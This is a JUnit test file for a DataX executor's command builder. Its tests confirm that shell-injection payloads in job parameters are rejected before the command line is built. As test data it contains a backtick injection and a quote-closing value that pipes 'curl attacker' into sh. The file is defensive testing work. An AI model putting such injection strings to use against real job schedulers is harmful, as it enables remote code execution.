package com.wugui.datax.executor.service.command;

import com.wugui.datatx.core.biz.model.TriggerParam;
import org.junit.Assert;
import org.junit.Test;

import java.io.File;
import java.io.IOException;
import java.util.Arrays;

/**
 * 批次 10-F 执行器侧：拼命令的那一刻必须自己再判一次。
 *
 * 管理端 add/update 已经拒收了，但执行器不能假设"能到我这儿的都是干净的"：
 * 库里可以有历史行，批量建任务会把模板里的 jvmParam 原样拷进新任务。
 * 这里钉的是顺序 —— 校验必须排在 datax.py 路径检查之前，更要排在拼出 argv 之前：
 * 一旦 argv 拼好交出去，datax.py 收尾就是 Popen(cmd, shell=True)，没有回头路。
 */
public class BuildCommandShellSafetyTest {

    private static TriggerParam param(String jvmParam, String replaceParam, String partitionInfo) {
        TriggerParam tgParam = new TriggerParam();
        tgParam.setJvmParam(jvmParam);
        tgParam.setReplaceParam(replaceParam);
        tgParam.setPartitionInfo(partitionInfo);
        return tgParam;
    }

    @Test
    public void refusesToBuildAnyArgvForShellPayloadInJvmParam() {
        // dataXPyPath 故意给一个不存在的文件：如果先做路径检查，异常文案会是"datax.py 文件不存在"。
        // 断言拿到的是注入文案，就证明了安全判定在拼命令之前。
        try {
            BuildCommand.buildDataXExecutorCmd(param("-Xmx1g `touch /tmp/pwned`", null, null),
                    "/tmp/does-not-matter.json", "/tmp/no-such-datax.py", "python3");
            Assert.fail("带反引号的 JVM 参数会经 datax.py 的 Popen(shell=True) 执行，必须拒绝拼这条命令");
        } catch (IllegalStateException e) {
            Assert.assertTrue(e.getMessage(), e.getMessage().contains("拒绝执行该作业"));
            Assert.assertTrue(e.getMessage(), e.getMessage().contains("反引号"));
        }
    }

    @Test
    public void refusesToBuildAnyArgvForShellPayloadInReplaceParam() {
        try {
            BuildCommand.buildDataXExecutorCmd(param(null, "-Did>=%s\" ; curl attacker|sh ; \"", null),
                    "/tmp/does-not-matter.json", "/tmp/no-such-datax.py", "python3");
            Assert.fail("能闭合掉 -p\"...\" 的双引号同样是命令注入");
        } catch (IllegalStateException e) {
            Assert.assertTrue(e.getMessage(), e.getMessage().contains("增量替换参数"));
        }
    }

    @Test
    public void refusesToBuildAnyArgvForBrokenPartitionInfo() {
        // 执行器原本会带着半截分区配置起 DataX 进程，再在 buildPartition 里抛 NumberFormatException
        try {
            BuildCommand.buildDataXExecutorCmd(param(null, null, "dt,last,yyyyMMdd"),
                    "/tmp/does-not-matter.json", "/tmp/no-such-datax.py", "python3");
            Assert.fail("分区偏移非整数");
        } catch (IllegalStateException e) {
            Assert.assertTrue(e.getMessage(), e.getMessage().contains("必须是整数"));
        }
    }

    @Test
    public void stillBuildsTheExpectedArgvForLegitimateParams() throws IOException {
        File dataxPy = File.createTempFile("datax", ".py");
        File tmpJson = File.createTempFile("job", ".json");
        dataxPy.deleteOnExit();
        tmpJson.deleteOnExit();
        try {
            String[] cmd = BuildCommand.buildDataXExecutorCmd(
                    param("-Xmx1g", "-DstartId=id>=%s and id<=%s", "dt,-1,yyyyMMdd"),
                    tmpJson.getAbsolutePath(), dataxPy.getAbsolutePath(), "python3");

            Assert.assertEquals("python3", cmd[0]);
            Assert.assertEquals(dataxPy.getAbsolutePath(), cmd[1]);
            Assert.assertEquals(tmpJson.getAbsolutePath(), cmd[cmd.length - 1]);
            Assert.assertTrue(Arrays.toString(cmd),
                    Arrays.asList(cmd).contains("-j\"-Xmx1g\""));
        } finally {
            tmpJson.delete();
            dataxPy.delete();
        }
    }

    @Test
    public void fallsBackToPythonWhenInterpreterNotConfigured() throws IOException {
        File dataxPy = File.createTempFile("datax", ".py");
        dataxPy.deleteOnExit();
        try {
            String[] cmd = BuildCommand.buildDataXExecutorCmd(param("-Xmx1g", null, null),
                    "/tmp/job.json", dataxPy.getAbsolutePath(), "   ");
            Assert.assertEquals("python", cmd[0]);
        } finally {
            dataxPy.delete();
        }
    }
}
